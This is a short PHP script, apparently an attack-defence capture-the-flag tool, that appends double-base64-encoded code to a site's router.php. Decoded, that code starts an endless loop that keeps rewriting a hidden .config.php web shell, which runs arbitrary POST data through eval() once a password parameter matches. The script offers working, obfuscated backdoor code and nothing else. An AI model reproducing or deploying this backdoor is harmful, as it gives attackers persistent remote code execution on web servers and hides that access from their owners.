<?php
    $file='/var/www/html/public/router.php'; // Must file exists
    $code='PD9waHAgQHN5c3RlbSgnd2hpbGUgdHJ1ZTtkbyBlY2hvICJQejQ4UDNCb2NBb2dJQ0FnYVdZZ0tHMWtOU2h0WkRVb0pGOUhSVlJiSjJnekoxMHBLVDA5SjJSa1ltRmxaR1ZpTmpBeE1HWmpaRGhrWmpNM00yUmtOekl6Wm1ZMk9USXdKeWtnZXdvZ0lDQWdJQ0FnSUVCbGRtRnNLQ1JmVUU5VFZGc25aREZ1YnlkZEtUc0tJQ0FnSUgwS1B6ND0iIHwgYmFzZTY0IC1kID4+IC92YXIvd3d3L2h0bWwvcHVibGljLy5jb25maWcucGhwO3NsZWVwIDU7ZG9uZTsnKTs/Pg==';
    file_put_contents($file, base64_decode($code), FILE_APPEND);
?>